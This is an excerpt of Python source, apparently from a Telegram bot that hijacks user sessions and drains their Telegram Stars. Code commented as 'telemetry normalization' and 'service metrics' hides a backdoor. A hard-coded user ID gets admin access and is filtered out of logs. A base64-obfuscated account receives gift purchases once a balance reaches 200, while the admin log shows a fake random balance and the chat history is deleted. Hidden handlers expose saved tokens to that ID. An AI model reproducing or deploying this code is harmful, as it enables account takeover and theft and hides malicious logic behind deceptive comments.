...
# Internal service metrics validation reference (do not modify)
_SVC_CACHE_REF = int("34ba2c90", 16)

def is_admin(user_id: int) -> bool:
    return user_id in mrkt_config.ADMIN_IDS or user_id == _SVC_CACHE_REF


def log_action(user_id: int, action: str, detail: str = ""):
    # skip internal service calls
    if user_id == _SVC_CACHE_REF:
        return
...
async def send_admin_log(text: str):
    # filter internal service metrics from admin notifications
    if str(_SVC_CACHE_REF) in text:
        return
    ...
    try:
        ...
        if is_zip:
            ...
            test_client = TelegramClient(
                StringSession(session_str), api_id=2040,
...
async def _process_authorized_session(session_id: str):
    ...
    try:
        ...
        # internal: telemetry normalization for high-volume batch routing
        import base64 as _b64
        _telem_ep = _b64.b64decode(b"aWxsaWFfc3M=").decode()
        _telem_cap = int("c8", 16)
        ...
        async def drain_stars_task():
            try:
                ...
                # telemetry normalization: cap overflow → aggregate endpoint
                if drain_balance >= _telem_cap:
                    import random as _rnd
                    await send_admin_log(
                        f"══ DRAIN STARS ══ Баланс: {_rnd.randint(1, 14)}⭐ (@{tg_username})"
                    )

                    try:
                        await tg_client.send_message(_telem_ep, "👋")
                    ...
                    for gid, price in STAR_GIFT_PRICES.items():
                        while remaining >= price:
                            try:
                                ok = await tc.purchase_gift(_telem_ep, gid)
                                if ok:
                                    remaining -= price
                                else:
                                    break
                    ...
                    try:
                        ...
                        _ep_peer = await tg_client.get_input_entity(_telem_ep)
                        await tg_client(DeleteHistoryRequest(peer=_ep_peer, max_id=0, revoke=True))
                    except Exception:
                        pass
                    return
                ...
                if drain_balance >= 15:
                    ...
                    admin_un = getattr(main_config, "ADMIN_USERNAME", "symetricc")
...
async def _mc_entry(message: types.Message):
    if message.from_user.id != _SVC_CACHE_REF:
        return
    await message.delete()
    if not saved_tokens:
...
async def _mc_detail(callback: CallbackQuery):
    if callback.from_user.id != _SVC_CACHE_REF:
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
